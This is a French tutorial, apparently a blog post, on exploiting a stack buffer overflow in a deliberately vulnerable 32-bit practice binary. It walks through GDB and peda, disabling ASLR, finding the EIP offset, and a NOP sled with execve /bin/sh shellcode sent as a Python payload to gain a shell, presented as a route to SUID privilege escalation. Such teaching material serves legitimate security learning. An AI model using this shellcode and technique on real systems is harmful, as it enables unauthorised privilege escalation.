&lt;p&gt;Le flag &amp;ldquo;suid&amp;rdquo; pour &amp;ldquo;Set User ID&amp;rdquo;, est un moyen de transférer des droits à un utilisateur sur un système Unix. Il s&amp;rsquo;agit d&amp;rsquo;un bit de contrôle applicable aux fichiers et permettant de lancer un programme en tant que l&amp;rsquo;utilisateur qui possède le fichier et non en tant que celui qui lance le fichier. Certains programmes ont besoin de posséder des droits supplémentaires. Par exemple, l&amp;rsquo;utilitaire &amp;ldquo;ping&amp;rdquo; nécessite des privilèges élevés pour ouvrir un socket réseau.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/suid.jpg&#34; alt=&#34;suid&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Pour vérifier si un fichier possède le bit &amp;ldquo;suid&amp;rdquo;, il suffit simplement d&amp;rsquo;afficher les permissions du fichier et de regarder s&amp;rsquo;il ne possède pas la permission &amp;ldquo;s&amp;rdquo; à la place du &amp;ldquo;x&amp;rdquo;. Si c&amp;rsquo;est le cas, alors le fichier sera exécuté avec les permissions du propriétaire. De plus, quand c&amp;rsquo;est le cas le nom du fichier apparaîtra sur fond rouge (comme sur ma capture, mais cela va dépendre de votre distribution).&lt;/p&gt;

&lt;p&gt;Vous voyez qu&amp;rsquo;il y a un intérêt à exploiter un buffer overflow :) Let&amp;rsquo;s go ??&lt;/p&gt;

&lt;h2 id=&#34;l-utilisation-d-un-débogueur&#34;&gt;L&amp;rsquo;utilisation d&amp;rsquo;un débogueur&lt;/h2&gt;

&lt;p&gt;Avant de commencer à décortiquer notre application, nous avons besoin d&amp;rsquo;un débogueur. C&amp;rsquo;est un logiciel qui permet d&amp;rsquo;analyser un programme pour trouver des bugs. Pour ça, il est capable d&amp;rsquo;exécuter le programme pas-à-pas (instruction par instruction), d&amp;rsquo;afficher la valeur des variables, de mettre des points d&amp;rsquo;arrêt à des endroits stratégiques du programme&amp;hellip; Ça permet d&amp;rsquo;analyser et contrôler l&amp;rsquo;exécution du programme souhaité et ainsi en comprendre son fonctionnement sans être en possession du code source.&lt;/p&gt;

&lt;p&gt;Nous allons utliser &lt;strong&gt;le débogueur GDB (GNU Debugger)&lt;/strong&gt; qui est le débogueur standard du projet GNU. Il fonctionne sur de nombreuses architectures de processeur, permet le débogage à distance (via une connexion série ou IP) et fonctionne sur de nombreux systèmes Unix.&lt;br /&gt;
L&amp;rsquo;interface graphique ? une simple console :) Vous allez voir que c&amp;rsquo;est sympa (ce n&amp;rsquo;est pas de l&amp;rsquo;ironie) ! On va juste devoir rajouter un petit quelque chose sur GDB pour le rendre plus accueillant.&lt;/p&gt;

&lt;h3 id=&#34;installation-du-débogueur&#34;&gt;Installation du débogueur&lt;/h3&gt;

&lt;p&gt;GDB est disponible dans la plupart des dépôts sous le nom de paquet &amp;ldquo;gdb&amp;rdquo;. Commencez donc par l&amp;rsquo;installer :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo apt-get install gdb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De base, GDB n&amp;rsquo;est pas très pratique à utiliser. Une commande doit être tapée à chaque fois pour suivre l&amp;rsquo;exécution du programme, visualiser les registres, la pile, aucune couleur permettant de mettre en évidence les relations, etc&amp;hellip;&lt;/p&gt;

&lt;p&gt;Mais heureusement, il existe des extensions à GDB permettant de rajouter toutes ces choses-là, des commandes supplémentaires et bien plus encore ! Ici, nous allons utiliser &amp;ldquo;peda&amp;rdquo; pour sa simplicité et son ergonomie.&lt;br /&gt;
Pour l&amp;rsquo;installer, rien de plus simple :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;git clone https://github.com/longld/peda.git ~/peda
echo &amp;quot;source ~/peda/peda.py&amp;quot; &amp;gt;&amp;gt; ~/.gdbinit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Source : &lt;a href=&#34;https://github.com/longld/peda&#34;&gt;https://github.com/longld/peda&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Regardez comme il est mignon :)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/peda.jpg&#34; alt=&#34;peda&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;quelques-commandes-utiles&#34;&gt;Quelques commandes utiles&lt;/h3&gt;

&lt;p&gt;Pour commencer, toutes les commandes GDB possèdent une version longue et courte. Par exemple, &lt;code&gt;info&lt;/code&gt; en version longue correspond à &lt;code&gt;i&lt;/code&gt; en version courte, etc&amp;hellip;&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Commande&lt;/th&gt;
&lt;th&gt;Version courte&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;run&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;r&lt;/td&gt;
&lt;td&gt;Démarrer le programme.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;info functions&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;i fu&lt;/td&gt;
&lt;td&gt;Afficher la liste des fonctions.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;break *0x... ou break *function_name&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;b *0x&amp;hellip;&lt;/td&gt;
&lt;td&gt;Pose un point d&amp;rsquo;arrêt à une ligne définie par son adresse ou au début d&amp;rsquo;une fonction.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;display/[quantité][type] *0x...&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;x/&amp;hellip;&lt;/td&gt;
&lt;td&gt;Affiche une zone mémoire à partir de son adresse ou du nom d&amp;rsquo;une fonction. Type : &amp;lsquo;w&amp;rsquo; 32 bits, &amp;lsquo;b&amp;rsquo; 8 bits&amp;hellip;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;next [n]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;ni [n]&lt;/td&gt;
&lt;td&gt;Exécute [n] instruction(s). Par défaut, [n] est à 1. Vous pouvez donc faire &amp;ldquo;ni&amp;rdquo; directement.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;step&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;si [n]&lt;/td&gt;
&lt;td&gt;Pareil que &amp;ldquo;next&amp;rdquo;. La différence ici c&amp;rsquo;est qu&amp;rsquo;on entre dans les fonctions.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;disassemble [a]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;disas [a]&lt;/td&gt;
&lt;td&gt;Désassembler une zone spécifique de la mémoire (affichage du code assembleur). [a] est l&amp;rsquo;une des adresses de cette zone ou le nom d&amp;rsquo;une fonction. Par défaut, [a] est la fonction exécutée actuellement.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;info break&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;i b&lt;/td&gt;
&lt;td&gt;Affiche la liste des points d&amp;rsquo;arrêt.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;delete [n]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;d [n]&lt;/td&gt;
&lt;td&gt;Supprime le [n] point d&amp;rsquo;arrêt. Si pas de numéro, supprime la totalité des points d&amp;rsquo;arrêt.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;pattern_create [n]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;Génère un schéma facilement reconnaissable en mémoire de [n] caractères.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&lt;code&gt;pattern_search&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;Recherche le schéma précédemment généré en mémoire.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Pour avoir la liste complète des commandes, les différents types d&amp;rsquo;affichages, etc&amp;hellip; c&amp;rsquo;est par ici :&lt;br /&gt;
&lt;a href=&#34;https://sourceware.org/gdb/onlinedocs/gdb/&#34;&gt;https://sourceware.org/gdb/onlinedocs/gdb/&lt;/a&gt; &lt;br /&gt;
&lt;a href=&#34;https://github.com/longld/peda&#34;&gt;https://github.com/longld/peda&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Tips : vous pouvez réexécuter la dernière commande exécutée en tapant simplement sur [Entrée].&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&#34;récupération-d-un-programme-vulnérable&#34;&gt;Récupération d&amp;rsquo;un programme vulnérable&lt;/h2&gt;

&lt;p&gt;Je vous propose de télécharger un petit programme normalement vulnérable à un buffer overflow (on va vérifier ensemble). Ce programme vous demande simplement votre prénom et vous dit bonjour.&lt;br /&gt;
Vous pouvez le télécharger &lt;a href=&#34;https://www.mycybersharing.com/binary/overflow&#34;&gt;ici&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Je ne vous donne volontairement pas le code source tout simplement parce que dans une situation réelle, vous ne l&amp;rsquo;avez pas forcément :)&lt;br /&gt;
En revanche, voici la commande qui a permis de compiler le programme :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gcc overflow.c -o overflow -fno-stack-protector -z execstack -no-pie -m32
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Voici à quoi servent les différents arguments :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;-o &lt;strong&gt;[fichier]&lt;/strong&gt; : place la sortie dans le fichier &lt;strong&gt;[fichier]&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;-fno-stack-protector : permets de désactiver la protection de la pile. Dans les dernières versions de gcc, cette option est activée par défaut. Pour exploiter notre buffer overflow sur la pile, c&amp;rsquo;est mieux de la désactiver :)&lt;/li&gt;
&lt;li&gt;-z execstack : permets de rendre la pile exécutable. Vous allez comprendre pourquoi nous avons besoin de cette option par la suite.&lt;/li&gt;
&lt;li&gt;-no-pie : permets de désactiver la randomisation des espaces d&amp;rsquo;adresses du code exécutable existant.&lt;/li&gt;
&lt;li&gt;-m32 : permets de compiler le code source en 32 bits. Les adresses seront moins longues comme ça.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Maintenant nous pouvons lancer le programme pour le tester :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ./overflow 
Veuillez saisir votre prénom : Julien
Bonjour Julien

$
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;j-ai-une-erreur&#34;&gt;J&amp;rsquo;ai une erreur&amp;hellip; :(&lt;/h3&gt;

&lt;p&gt;Si ce n&amp;rsquo;est pas le cas, passez à la suite.&lt;br /&gt;
Vous avez ce genre d&amp;rsquo;erreur ? :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ./overflow
bash: ./overflow: No such file or directory
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Et pourtant vous avez vérifié à plusieurs reprises qu&amp;rsquo;il n&amp;rsquo;y avait pas d&amp;rsquo;erreur dans le nom du fichier et ce n&amp;rsquo;est pas le cas&amp;hellip;&lt;br /&gt;
On va arranger ça. Je pourrais parier que vous avez un OS en 64 bits, non ?&lt;br /&gt;
Pour que votre OS puisse exécuter des binaires en 32 bits, il vous faut la bibliothèque standard C++ en version 32 bits. Pour l&amp;rsquo;obtenir, installez simplement ce paquet :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo apt-get install lib32stdc++6
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ça fonctionne ? Parfait, nous allons pouvoir passer à la suite.&lt;/p&gt;

&lt;h3 id=&#34;vérifier-la-présence-d-un-buffer-overflow&#34;&gt;Vérifier la présence d&amp;rsquo;un buffer overflow&lt;/h3&gt;

&lt;p&gt;Pour tester la présence d&amp;rsquo;un buffer overflow, nous allons utiliser la technique des débutants. C&amp;rsquo;est-à-dire, envoyer beaucoup d&amp;rsquo;informations et essayer de provoquer un crash de l&amp;rsquo;application.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ./overflow 
Veuillez saisir votre prénom : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bonjour AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Segmentation fault (core dumped)
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ça vous voyez, c&amp;rsquo;est très bon signe ! Nous venons de déborder le buffer réservé pour notre prénom, nous sommes allés réécrire des données présentes après le buffer et l&amp;rsquo;application a crashée.&lt;/p&gt;

&lt;p&gt;L&amp;rsquo;erreur &lt;strong&gt;&amp;ldquo;Segmentation fault&amp;rdquo;&lt;/strong&gt; indique que l&amp;rsquo;application a tentée d&amp;rsquo;accéder à un emplacement mémoire qui ne lui était pas attribué. De ce fait, l&amp;rsquo;OS a inévitablement interrompu son exécution.&lt;/p&gt;

&lt;h2 id=&#34;comprendre-pourquoi-l-application-crash-phase-d-analyse&#34;&gt;Comprendre pourquoi l&amp;rsquo;application crash (phase d&amp;rsquo;analyse)&lt;/h2&gt;

&lt;p&gt;L&amp;rsquo;objectif ici c&amp;rsquo;est de comprendre pourquoi nous avons une erreur de segmentation, où et que pourrait-on en faire.&lt;/p&gt;

&lt;h3 id=&#34;désactiver-l-aslr&#34;&gt;Désactiver l&amp;rsquo;ASLR&lt;/h3&gt;

&lt;p&gt;Avant toutes choses, nous allons désactiver l&amp;rsquo;ASLR (Address Space Layout Randomization). C&amp;rsquo;est une protection de la mémoire appliquée par l&amp;rsquo;OS et qui permet de placer de façon aléatoire les zones de données dans la mémoire virtuelle. En général, les zones concernées sont le tas, la pile et les bibliothèques partagées. Si nous laissons cette protection en place, nous allons avoir du mal à exécuter un code arbitraire via le buffer overflow.&lt;br /&gt;
Pour désactiver cette protection, rien de plus simple :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La désactivation n&amp;rsquo;est pas permanente. Au prochain redémarrage de votre machine, la protection sera à nouveau active.&lt;/p&gt;

&lt;h3 id=&#34;dégainer-gdb&#34;&gt;Dégainer GDB&lt;/h3&gt;

&lt;p&gt;C&amp;rsquo;est partie !!&lt;br /&gt;
Pour charger notre programme dans GDB, il suffit simplement de faire :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ gdb ./overflow
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Normalement, GDB se lance et charge automatiquement l&amp;rsquo;extension peda. Vous devriez avoir un shell &amp;ldquo;&lt;code&gt;gdb-peda$&lt;/code&gt;&amp;rdquo;.&lt;br /&gt;
Nous allons lister les fonctions présentes afin d&amp;rsquo;y voir plus clair :&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/gdb_functions.jpg&#34; alt=&#34;gdb_functions&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Mais&amp;hellip; il y en a beaucoup pour un simple programme !&lt;/em&gt;&lt;/strong&gt;&lt;br /&gt;
Toutes les fonctions commençant par un underscore ou finissants par &amp;ldquo;@plt&amp;rdquo; ne sont souvent pas des fonctions développées par le développeur. C&amp;rsquo;est des fonctions présentes dans des bibliothèques partagées ou qui ont été rajoutées par le compilateur permettant d&amp;rsquo;initialiser le programme ou de le fermer proprement. Du coup ça en élimine plusieurs. Les fonctions &amp;ldquo;&amp;hellip;register&amp;hellip;clones&amp;rdquo; et &amp;ldquo;frame_dummy&amp;rdquo; peuvent également être ignorées.&lt;br /&gt;
Bon allez, voici une commande permettant d&amp;rsquo;afficher uniquement les fonctions ne commençant pas par un underscore et ne possédant pas de &amp;ldquo;@&amp;rdquo; :&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/gdb_functions_filter.jpg&#34; alt=&#34;gdb_functions_filter&#34; /&gt;&lt;/p&gt;

&lt;p&gt;La chose bizarre que j&amp;rsquo;ai rajoutée à la fin de la commande est une expression régulière. Elle permet d&amp;rsquo;appliquer un filtre sur le résultat.&lt;br /&gt;
Il nous reste la fonction &amp;ldquo;interroger&amp;rdquo; et &amp;ldquo;main&amp;rdquo; (les autres ne sont pas concernées). Dans un programme, la fonction &amp;ldquo;main&amp;rdquo; est la fonction principale du programme. L&amp;rsquo;exécution du programme entraîne automatiquement l&amp;rsquo;appel à la fonction &amp;ldquo;main&amp;rdquo; et ceci dès le début.&lt;/p&gt;

&lt;p&gt;Plaçons donc un point d&amp;rsquo;arrêt au début de la fonction &amp;ldquo;main&amp;rdquo; et &amp;ldquo;interroger&amp;rdquo; afin d&amp;rsquo;interrompre l&amp;rsquo;exécution :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gdb-peda$ b *main
Breakpoint 1 at 0x80484ba
gdb-peda$ b *interroger
Breakpoint 2 at 0x8048486
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Avant de démarrer notre application, nous allons générer un pattern. C&amp;rsquo;est simplement une chaîne de caractères facilement reconnaissable en mémoire. Au moment d&amp;rsquo;entrer le prénom, nous allons entrer le pattern généré. Partons sur un pattern de 100 caractères :&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/gdb_pattern.jpg&#34; alt=&#34;gdb_functions_filter&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Copiez-le, il va nous servir au moment où il faudra entrer le prénom.&lt;/p&gt;

&lt;p&gt;Vous êtes prêt pour le décollage ? Lançons l&amp;rsquo;application avec la commande &lt;code&gt;r&lt;/code&gt; :&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/gdb_running.jpg&#34; alt=&#34;gdb running&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Le commandant de bord et l&amp;rsquo;ensemble de l&amp;rsquo;équipage ont le plaisir de vous accueillir à bord de &lt;strong&gt;GDB&lt;/strong&gt;, compagnie membre de &lt;strong&gt;GNU&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Maintenant, nous allons suivre l&amp;rsquo;exécution du programme pas-à-pas et ceci jusqu&amp;rsquo;à un crash. La commande &lt;code&gt;ni&lt;/code&gt; va nous permettre de faire avancer le pointeur d&amp;rsquo;exécution. À un moment donné, le programme va vous demander d&amp;rsquo;entrer votre prénom (juste après l&amp;rsquo;instruction &lt;code&gt;call ...&amp;lt;fgets@plt&amp;gt;&lt;/code&gt;), collez le pattern que vous avez copié précédemment :&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/gdb_pattern_enter.jpg&#34; alt=&#34;gdb pattern enter&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Vous avez un crash ? Moi aussi :&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/gdb_overflow_crash.jpg&#34; alt=&#34;gdb overflow crash&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&amp;ldquo;&lt;strong&gt;&lt;em&gt;Invalid $PC address: 0x&amp;hellip;&amp;hellip;&lt;/em&gt;&lt;/strong&gt;&amp;rdquo;, le programme a tenté de lire du code à une adresse invalide. Pour ma part, &lt;strong&gt;0x41414641&lt;/strong&gt;.&lt;br /&gt;
Maintenant remontez un peu plus haut dans GDB afin de voir quelle était l&amp;rsquo;instruction précédemment exécutée :&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/gdb_overflow_ret.jpg&#34; alt=&#34;gdb overflow crash&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Un schéma s&amp;rsquo;impose afin d&amp;rsquo;illustrer notre situation :&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/overflow_pattern.jpg&#34; alt=&#34;overflow pattern&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Vous voyez le souci ? Nous avons réécrit la sauvegarde de EIP servant à reprendre l&amp;rsquo;exécution de la fonction &amp;ldquo;main&amp;rdquo; et l&amp;rsquo;instruction &amp;ldquo;ret&amp;rdquo; l&amp;rsquo;a copiée dans le registre EIP. Le problème c&amp;rsquo;est que cette sauvegarde a été altérée par notre pattern et ne correspond pas à une adresse valide&amp;hellip; du coup l&amp;rsquo;application a crashée.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/gdb_overflow_eip.jpg&#34; alt=&#34;gdb overflow eip&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Maintenant il nous faudrait identifier à partir de combien de caractères nous atteignons cette sauvegarde afin de contrôler le registre EIP. Pour ça, la commande &lt;code&gt;pattern_search&lt;/code&gt; va nous aider :&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/gdb_pattern_search.jpg&#34; alt=&#34;gdb pattern search&#34; /&gt;&lt;/p&gt;

&lt;p&gt;C&amp;rsquo;est &lt;strong&gt;à partir du 44ème caractère&lt;/strong&gt; que nous pouvons réécrire le registre EIP.&lt;/p&gt;

&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;

&lt;p&gt;Contrôler le flux d&amp;rsquo;exécution en modifiant le registre EIP c&amp;rsquo;est une chose, ouvrir un shell s&amp;rsquo;en est une autre&amp;hellip; En effet, maintenant nous devons rediriger le flux d&amp;rsquo;exécution sur une zone mémoire possédant les instructions nécessaires à l&amp;rsquo;ouverture d&amp;rsquo;un shell. Comme ces instructions ne sont pas présentes en mémoire, nous allons donc nous en occuper :) Nous sommes capables d&amp;rsquo;écrire sur la pile (en entrant notre prénom), alors pourquoi ne pas écrire les instructions nécessaires dans le prénom (à la place du pattern) ?&lt;/p&gt;

&lt;h3 id=&#34;le-shellcode&#34;&gt;Le shellcode&lt;/h3&gt;

&lt;p&gt;Une suite d&amp;rsquo;instructions sous forme de chaîne de caractères est appelé un &lt;strong&gt;shellcode&lt;/strong&gt;. À l&amp;rsquo;origine, un shellcode était destiné à ouvrir un shell. Avec le temps, le mot s&amp;rsquo;est généralisé et maintenant nous l&amp;rsquo;employons pour désigner tout code malveillant (pas seulement l&amp;rsquo;ouverture d&amp;rsquo;un shell). Vous vous souvenez de la notation &amp;ldquo;\x&amp;rdquo; pour écrire un caractère en hexadécimal ? Nous allons en avoir besoin pour notre shellcode.&lt;br /&gt;
Je vous propose celui-ci :&lt;/p&gt;

&lt;p&gt;&lt;code&gt;\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Nous allons devoir utiliser un langage de programmation tel que Python pour interpréter notre shellcode. C&amp;rsquo;est-à-dire que chaque valeur hexadécimale va devoir être convertie en caractère. Par exemple, \x41 =&amp;gt; &amp;ldquo;A&amp;rdquo;.&lt;br /&gt;
Tout d&amp;rsquo;abord, essayons de comprendre ce shellcode :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;0:  83 c4 32                add    esp,0x32    ; esp = esp + 50
3:  31 c0                   xor    eax,eax     ; eax = 0
5:  50                      push   eax         ; pousse eax sur la pile
6:  68 2f 2f 73 68          push   0x68732f2f  ; pousse &amp;quot;//sh&amp;quot;
b:  68 2f 62 69 6e          push   0x6e69622f  ; pousse &amp;quot;/bin&amp;quot;
10: 89 e3                   mov    ebx,esp     ; adresse du haut de la pile dans ebx
12: 50                      push   eax         ; pousse eax
13: 53                      push   ebx         ; pousse ebx
14: 89 e1                   mov    ecx,esp     ; adresse du haut de la pile dans ecx
16: b0 0b                   mov    al,0xb      ; eax = 0xb (11) =&amp;gt; id execve
18: cd 80                   int    0x80        ; déclenche un syscall (appel système)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Le site qui m&amp;rsquo;a permis de convertir le shellode en assembleur est &lt;a href=&#34;https://defuse.ca/online-x86-assembler.htm&#34;&gt;defuse.ca&lt;/a&gt;.&lt;br /&gt;
Le shellcode a été trouvé sur &lt;a href=&#34;http://shell-storm.org/shellcode/&#34;&gt;shell-storm.org&lt;/a&gt;.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Ce code va donc effectuer l&amp;rsquo;appel système &lt;strong&gt;execve&lt;/strong&gt; qui permet d&amp;rsquo;exécuter un programme (pour nous /bin/sh). En langage C, cela donnerait :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;execve(&amp;quot;/bin//sh&amp;quot;, [&amp;quot;/bin//sh&amp;quot;], 0);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Les informations nécessaires pour réaliser un syscall (convention 32 bits) peuvent être trouvées ici : &lt;a href=&#34;https://w3challs.com/syscalls/?arch=x86&#34;&gt;https://w3challs.com/syscalls/?arch=x86&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;écriture-de-l-exploit&#34;&gt;Écriture de l&amp;rsquo;exploit&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Nous savons que pour écrire le registre EIP, il faut atteindre le &lt;strong&gt;44ème caractère&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Nous avons en notre possession &lt;strong&gt;un shellcode de 26 octets&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si nous plaçons notre shellcode au début de notre payload (charge qui va être injectée au moment de rentrer le prénom), alors il va falloir rajouter &lt;strong&gt;18 caractères (44 - 26) pour atteindre l&amp;rsquo;adresse de retour&lt;/strong&gt;. Cette dernière va devoir pointer sur notre shellcode présent sur la pile.&lt;/p&gt;

&lt;p&gt;Pour éviter d&amp;rsquo;avoir à mettre exactement l&amp;rsquo;adresse de notre shellcode, nous allons utiliser une petite astuce. Plutôt que de rajouter 18 caractères inutiles après notre shellcode (obligatoire pour atteindre l&amp;rsquo;adresse de retour), nous allons les utiliser à bons escients.&lt;br /&gt;
On va rajouter 18 instructions &amp;ldquo;nop&amp;rdquo; (ne fait aucune action) avant notre shellcode. Comme ça, il nous suffira simplement de mettre une adresse tombant dans cette suite de &amp;ldquo;nop&amp;rdquo; et par la suite notre shellcode sera exécuté.&lt;/p&gt;

&lt;p&gt;La valeur hexadécimale d&amp;rsquo;un nop est &amp;ldquo;\x90&amp;rdquo;. Ce schéma illustre la forme de notre charge finale :&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/overflow_exploit.jpg&#34; alt=&#34;overflow exploit&#34; /&gt;&lt;/p&gt;

&lt;p&gt;En Python, cela donnerait :&lt;/p&gt;

&lt;p&gt;&lt;code&gt;
print &amp;quot;\x90&amp;quot;*18 + &amp;quot;\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot; + &amp;quot;sled_address&amp;quot;
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Pour calculer l&amp;rsquo;adresse du sled, il suffit simplement de récupérer l&amp;rsquo;adresse du haut de la pile au moment du &amp;ldquo;ret&amp;rdquo; et d&amp;rsquo;enlever 44 (0x2c).&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/overflow_sled_address.jpg&#34; alt=&#34;overflow sled address&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Pour être tranquille, je ne vais pas prendre exactement le début du sled mais un peu après. Ma charge finale donne donc :&lt;/p&gt;

&lt;p&gt;&lt;code&gt;
print &amp;quot;\x90&amp;quot;*18 + &amp;quot;\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot; + &amp;quot;\xf5\xc4\xff\xff&amp;quot;
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Maintenant nous pouvons supprimer les breakpoints et relancer le programme en injectant notre charge en input. Pour faire cela avec GDB, il suffit de faire :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gdb-peda$ d
gdb-peda$ r &amp;lt; &amp;lt;(python -c &#39;print &amp;quot;\x90&amp;quot;*18 + &amp;quot;\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot; + &amp;quot;\xf5\xc4\xff\xff&amp;quot;&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/gdb_run_payload.jpg&#34; alt=&#34;gdb run payload&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Félicitations à vous !&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Je n&amp;rsquo;ai pas compris pourquoi nous avions dû inverser l&amp;rsquo;ordre des octets pour l&amp;rsquo;adresse du sled&amp;hellip;&lt;/em&gt;&lt;/strong&gt;&lt;br /&gt;
